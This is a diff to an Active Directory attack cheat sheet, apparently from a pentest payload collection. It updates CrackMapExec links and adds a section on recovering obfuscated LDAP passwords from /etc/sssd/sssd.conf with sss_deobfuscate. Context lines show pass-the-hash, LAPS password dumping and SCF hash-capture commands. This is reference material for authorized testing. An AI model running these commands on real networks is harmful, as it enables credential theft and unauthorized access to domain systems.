@@ -143,6 +143,7 @@
     - [CCACHE ticket reuse from SSSD KCM](#ccache-ticket-reuse-from-sssd-kcm)
     - [CCACHE ticket reuse from keytab](#ccache-ticket-reuse-from-keytab)
     - [Extract accounts from /etc/krb5.keytab](#extract-accounts-from-etckrb5keytab)
+    - [Extract accounts from /etc/sssd/sssd.conf](#extract-accounts-from-etcsssdsssdconf)
   - [References](#references)
 
 ## Tools
@@ -153,11 +154,11 @@
 * [Mimikatz](https://github.com/gentilkiwi/mimikatz)
 * [Ranger](https://github.com/funkandwagnalls/ranger)
 * [AdExplorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer)
-* [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
+* [CrackMapExec](https://github.com/mpgn/CrackMapExec)
 
   ```powershell
   # use the latest release, CME is now a binary packaged will all its dependencies
-  root@payload$ wget https://github.com/byt3bl33d3r/CrackMapExec/releases/download/v5.0.1dev/cme-ubuntu-latest.zip
+  root@payload$ wget https://github.com/mpgn/CrackMapExec/releases/download/v5.0.1dev/cme-ubuntu-latest.zip
 
   # execute cme (smb, winrm, mssql, ...)
   root@payload$ cme smb -L
@@ -1018,7 +1019,7 @@ IconFile=\\10.10.10.10\Share\test.ico
 Command=ToggleDesktop
 ```
 
-Using [`crackmapexec`](https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/modules/slinky.py):
+Using [`crackmapexec`](https://github.com/mpgn/CrackMapExec/blob/master/cme/modules/slinky.py):
 
 ```ps1
 crackmapexec smb 10.10.10.10 -u username -p password -M scuffy -o NAME=WORK SERVER=IP_RESPONDER #scf
@@ -1567,7 +1568,7 @@ Get-AuthenticodeSignature 'c:\program files\LAPS\CSE\Admpwd.dll'
        ./pyLAPS.py --action set --computer 'PC01$' -u 'Administrator' -d 'LAB.local' -p 'Admin123!' --dc-ip 192.168.2.1
        ```
      
-   * [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec):
+   * [CrackMapExec](https://github.com/mpgn/CrackMapExec):
        ```bash
        crackmapexec smb 10.10.10.10 -u 'user' -H '8846f7eaee8fb117ad06bdd830b7586c' -M laps
        ```
@@ -3560,7 +3561,7 @@ Check the `TRUSTED_FOR_DELEGATION` property.
   grep TRUSTED_FOR_DELEGATION domain_computers.grep
   ```
 
-* [CrackMapExec module](https://github.com/byt3bl33d3r/CrackMapExec/wiki) 
+* [CrackMapExec module](https://github.com/mpgn/CrackMapExec/wiki) 
   ```powershell
   cme ldap 10.10.10.10 -u username -p password --trusted-for-delegation
   ```
@@ -4276,6 +4277,33 @@ $ crackmapexec 10.XXX.XXX.XXX -u 'COMPUTER$' -H "31d6cfe0d16ae931b73c59d7e0c089c
 CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae931b73c59d7e0c089c0  
 ```
 
+
+## Extract accounts from /etc/sssd/sssd.conf
+
+> sss_obfuscate converts a given password into human-unreadable format and places it into appropriate domain section of the SSSD config file, usually located at /etc/sssd/sssd.conf
+
+The obfuscated password is put into "ldap_default_authtok" parameter of a given SSSD domain and the "ldap_default_authtok_type" parameter is set to "obfuscated_password". 
+
+```ini
+[sssd]
+config_file_version = 2
+...
+[domain/LDAP]
+...
+ldap_uri = ldap://127.0.0.1
+ldap_search_base = ou=People,dc=srv,dc=world
+ldap_default_authtok_type = obfuscated_password
+ldap_default_authtok = [BASE64_ENCODED_TOKEN]
+```
+
+De-obfuscate the content of the ldap_default_authtok variable with [mludvig/sss_deobfuscate](https://github.com/mludvig/sss_deobfuscate)
+
+```ps1
+./sss_deobfuscate [ldap_default_authtok_base64_encoded]
+./sss_deobfuscate AAAQABagVAjf9KgUyIxTw3A+HUfbig7N1+L0qtY4xAULt2GYHFc1B3CBWGAE9ArooklBkpxQtROiyCGDQH+VzLHYmiIAAQID
+```
+
+
 ## References
 
 * [Explain like I’m 5: Kerberos - Apr 2, 2013 - @roguelynn](https://www.roguelynn.com/words/explain-like-im-5-kerberos/)
@@ -4414,3 +4442,4 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae
 * [S4U2self abuse - TheHackerRecipes](https://www.thehacker.recipes/ad/movement/kerberos/delegations/s4u2self-abuse)
 * [Abusing Kerberos S4U2self for local privilege escalation - cfalta](https://cyberstoph.org/posts/2021/06/abusing-kerberos-s4u2self-for-local-privilege-escalation/)
 * [External Trusts Are Evil - 14 March 2023 - Charlie Clark (@exploitph)](https://exploit.ph/external-trusts-are-evil.html)
+* [Certificates and Pwnage and Patches, Oh My! - Will Schroeder - Nov 9, 2022](https://posts.specterops.io/certificates-and-pwnage-and-patches-oh-my-8ae0f4304c1d)
